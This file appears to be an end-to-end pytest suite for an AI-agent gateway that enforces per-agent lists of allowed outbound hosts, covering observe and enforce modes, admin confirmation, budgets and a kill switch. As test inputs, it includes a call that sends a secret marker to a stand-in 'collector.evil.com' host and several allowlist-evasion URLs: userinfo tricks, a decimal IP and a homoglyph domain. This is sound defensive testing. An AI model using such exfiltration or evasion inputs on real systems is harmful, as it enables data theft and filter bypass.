"""
Phase 4 M7 (done test 11), end to end through the real gateway and the real core: an admin lists the hosts an agent may send data to, observe
records an address outside the list and refuses nothing, enforce refuses it before it reaches the tool, a change made through the API reaches
the gateway on the next call, and only an admin with a confirmation can turn enforcement on.
"""

from __future__ import annotations

import json
from typing import Any

import httpx
import pytest

from test_phase1_done import Stack

from agentwall.src.gateway.upstream import UpstreamForwarder

ALL_TOOLS = [{"server": "xero", "tool": "*", "access": "read"}]
SECRET = "zq-marker-5531"


async def _setup(monkeypatch: pytest.MonkeyPatch) -> tuple[Stack, str, str, list[dict[str, Any]]]:
    stack = Stack(monkeypatch, context_ttl=0.0)  # no context cache: a change applies on the next call
    received: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        message = json.loads(request.content)
        if message["method"] == "tools/call":
            received.append(message)
        result: Any = {"content": [{"type": "text", "text": "ok"}], "isError": False} if message["method"] == "tools/call" else {}
        return httpx.Response(200, json={"jsonrpc": "2.0", "id": message["id"], "result": result})

    stack.gateway.forwarder = UpstreamForwarder(allow_insecure=True, max_response_bytes=1_000_000, connect_timeout=2, total_timeout=5,
                                                http_client=httpx.AsyncClient(transport=httpx.MockTransport(handler)))
    await stack.register_server()
    created = await stack.register_agent("Report bot", ALL_TOOLS)
    agent_id = (await stack.core.get("/v1/passports", headers=stack.operator("viewer"))).json()[0]["id"]
    return stack, await stack.agent_token(created["agent_key"]), agent_id, received


async def _allow(stack: Stack, agent: str, host: str, user: str = "admin") -> httpx.Response:
    return await stack.core.post(f"/v1/passports/{agent}/destinations", json={"host": host, "confirm": True}, headers=stack.operator(user))


async def _mode(stack: Stack, agent: str, mode: str, expected: str, user: str = "admin", **extra: Any) -> httpx.Response:
    return await stack.core.put(
        f"/v1/passports/{agent}/destination-mode", json={"destination_mode": mode, "expected_mode": expected, **extra}, headers=stack.operator(user)
    )


async def _call(stack: Stack, token: str, **args: Any) -> httpx.Response:
    response = await stack.call_tool(token, "send_report", **args)
    await stack.gateway.radar.wait_idle()
    return response


def _refused(response: httpx.Response) -> bool:
    return "error" in response.json()


async def _findings(stack: Stack) -> list[dict[str, Any]]:
    resp = await stack.core.get("/v1/findings", params={"kind": "destination"}, headers=stack.operator("operator"))
    assert resp.status_code == 200, resp.text
    return list(resp.json()["findings"])


@pytest.mark.asyncio
async def test_done_11_observe_records_an_address_outside_the_list_and_refuses_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    assert (await _allow(stack, agent, "good.com")).status_code == 200
    assert (await _mode(stack, agent, "observe", "off")).status_code == 200
    assert not _refused(await _call(stack, token, url="https://good.com/report"))
    assert await _findings(stack) == []
    for _ in range(3):
        assert not _refused(await _call(stack, token, url=f"https://{SECRET}.collector.evil.com/{SECRET}", note=SECRET))
    assert len(received) == 4  # observe changed no decision
    findings = await _findings(stack)
    assert len(findings) == 1
    finding = findings[0]
    assert finding["rule_id"] == "RAD-DST-001" and finding["kind"] == "destination" and finding["place"] == "call" and finding["detail"] == "evil.com"
    assert finding["agent_name"] == "Report bot" and finding["tool_name"] == "send_report"
    assert SECRET not in json.dumps(findings)
    # a destination is not a false alarm of the Radar's own checks
    radar = await stack.core.get("/v1/radar/settings", headers=stack.operator("operator"))
    assert radar.json()["last_7_days"].get("findings", 0) == 0
    settings = await stack.core.get(f"/v1/passports/{agent}/destinations", headers=stack.operator("operator"))
    assert settings.json()["last_7_days"]["findings"] == 1


@pytest.mark.asyncio
async def test_done_11_enforce_refuses_an_address_outside_the_list_before_it_reaches_the_tool(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    await _allow(stack, agent, "good.com")
    await _allow(stack, agent, "files.good.com")
    assert (await _mode(stack, agent, "enforce", "off", confirm=True)).status_code == 200
    assert not _refused(await _call(stack, token, url="https://good.com/a", cc="bob@files.good.com"))
    refused = await _call(stack, token, url="https://evil.com/a")
    assert _refused(refused) and refused.json()["error"]["code"] == -32000
    assert refused.json()["error"]["message"] == "PolicyViolation: this call contains an address that is not on this agent's allowed list."
    assert "evil" not in json.dumps(refused.json())
    assert len(received) == 1  # the refused call never reached the tool
    for value in ("https://good.com@evil.com/", "https://good.com\\@evil.com/", "http://2130706433/", "https://аpple.com/", "alice@evil.org"):
        assert _refused(await _call(stack, token, text=value)), value
    assert len(received) == 1
    assert len(await _findings(stack)) >= 1


@pytest.mark.asyncio
async def test_a_change_through_the_api_reaches_the_gateway_on_the_next_call(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    added = await _allow(stack, agent, "good.com")
    await _mode(stack, agent, "enforce", "off", confirm=True)
    assert _refused(await _call(stack, token, url="https://other.org/"))
    assert (await _allow(stack, agent, "other.org")).status_code == 200
    assert not _refused(await _call(stack, token, url="https://other.org/"))  # allowed now
    entry = next(e["id"] for e in (await stack.core.get(f"/v1/passports/{agent}/destinations", headers=stack.operator("operator"))).json()["entries"] if e["host"] == "other.org")
    assert (await stack.core.delete(f"/v1/passports/{agent}/destinations/{entry}", headers=stack.operator("admin"))).status_code == 200
    assert _refused(await _call(stack, token, url="https://other.org/"))  # no longer allowed
    assert added.status_code == 200 and len(received) == 1


@pytest.mark.asyncio
async def test_only_an_admin_with_a_confirmation_can_turn_enforcement_on_and_only_with_a_list(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    for user in ("viewer", "operator"):
        assert (await _allow(stack, agent, "good.com", user)).status_code == 403
        assert (await _mode(stack, agent, "observe", "off", user)).status_code == 403
    assert (await _mode(stack, agent, "enforce", "off", confirm=True)).status_code == 409  # an empty list
    await _allow(stack, agent, "good.com")
    assert (await _mode(stack, agent, "enforce", "off")).status_code == 400  # no confirmation
    for _ in range(3):
        assert not _refused(await _call(stack, token, url="https://evil.com/"))  # nothing was switched on
    assert len(received) == 3


@pytest.mark.asyncio
async def test_a_refused_call_does_not_count_against_the_budget(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    limited = await stack.core.put(f"/v1/passports/{agent}/budget", json={"daily_call_limit": 2, "action": "deny", "confirm": True}, headers=stack.operator("admin"))
    assert limited.status_code == 200, limited.text
    await _allow(stack, agent, "good.com")
    await _mode(stack, agent, "enforce", "off", confirm=True)
    for _ in range(25):
        assert _refused(await _call(stack, token, url="https://evil.com/"))
    assert not _refused(await _call(stack, token, month="1")) and not _refused(await _call(stack, token, month="2"))
    assert _refused(await _call(stack, token, month="3"))  # now the budget's own refusal
    assert len(received) == 2


@pytest.mark.asyncio
async def test_turning_the_check_off_needs_a_confirmation_and_stops_the_checks(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    await _allow(stack, agent, "good.com")
    await _mode(stack, agent, "enforce", "off", confirm=True)
    assert _refused(await _call(stack, token, url="https://evil.com/"))
    assert (await _mode(stack, agent, "off", "enforce")).status_code == 400
    assert (await _mode(stack, agent, "off", "enforce", confirm=True)).status_code == 200
    assert not _refused(await _call(stack, token, url="https://evil.com/"))


@pytest.mark.asyncio
async def test_the_kill_switch_overrides_an_enforcing_agent(monkeypatch: pytest.MonkeyPatch) -> None:
    stack, token, agent, received = await _setup(monkeypatch)
    await _allow(stack, agent, "good.com")
    await _mode(stack, agent, "enforce", "off", confirm=True)
    stack.gateway.destination_check_enabled = False
    assert not _refused(await _call(stack, token, url="https://evil.com/"))
